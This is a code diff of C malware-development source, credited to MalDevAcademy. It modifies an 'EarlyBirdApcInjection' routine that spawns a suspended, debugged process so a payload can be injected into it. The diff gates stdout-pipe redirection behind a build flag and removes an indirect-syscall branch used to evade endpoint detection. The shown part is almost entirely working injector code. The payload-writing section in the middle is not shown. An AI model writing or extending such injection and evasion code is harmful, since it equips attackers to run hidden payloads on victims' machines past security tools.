@@ -1,15 +1,17 @@
 // @NUL0x4C | @mrd0x : MalDevAcademy
 
-#include "injection.h"
+#include "injectors.h"
 
 
 BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName, PBYTE pPayload, SIZE_T sPayloadSize) {
 	DWORD		dwProcessId		= 0;
 	PVOID		pAddress		= NULL;
     NTSTATUS	STATUS          = 0;
-
+    PROCESS_INFORMATION pi;
     HANDLE		hStdOutRead		= NULL,
                 hStdOutWrite	= NULL;
+
+#if defined(REDIRECT_OUTPUT)
     SECURITY_ATTRIBUTES  saAttr;
     saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
     saAttr.bInheritHandle = TRUE;
@@ -24,27 +26,19 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
         DebugPrint("Stdout SetHandleInformation: %d\n", GetLastError());
         return FALSE;
     }
+#endif
 
 //	creating target remote process (in debugged state)
 	DebugPrint("[i] Creating \"%ls\" Process As A Debugged Process ...\n", szProcessName);
 
-#ifdef HW_INDIRECT_SYSCALL
-    NTSTATUS status;
-    PROCESS_INFORMATION pi;
-
-    if (!CreateSuspendedProcessWithSyscall(szProcessName, &pi)) {
-        DebugPrint("[!] Failed to create process using indirect syscall.\n");
+    if (!CreateSuspendedProcess(szProcessName, &pi, hStdOutWrite, hStdOutWrite)) {
+		DebugPrint("[!] CreateSuspendedProcess Failed With Error : %d \n", GetLastError());
         return FALSE;
-    }
+	}
 
     dwProcessId = pi.dwProcessId;
     hProcess = pi.hProcess;
     hThread = pi.hThread;
-#else
-    if (!CreateSuspendedProcess(szProcessName, &dwProcessId, &hProcess, &hThread, hStdOutWrite, hStdOutWrite)) {
-		return FALSE;
-	}
-#endif
 
 	DebugPrint("[i] Suspended Process Created With Pid : %d \n", dwProcessId);
 	DebugPrint("[+] DONE \n\n");
@@ -91,7 +85,9 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
     Sleep(2000);
 	DebugPrint("[+] DONE \n\n");
 
+#if defined(REDIRECT_OUTPUT)
     ReadFromRemotePipe(hStdOutRead);
+#endif
 
 // Closing the handles to the process and thread
 	CloseHandle(hProcess);
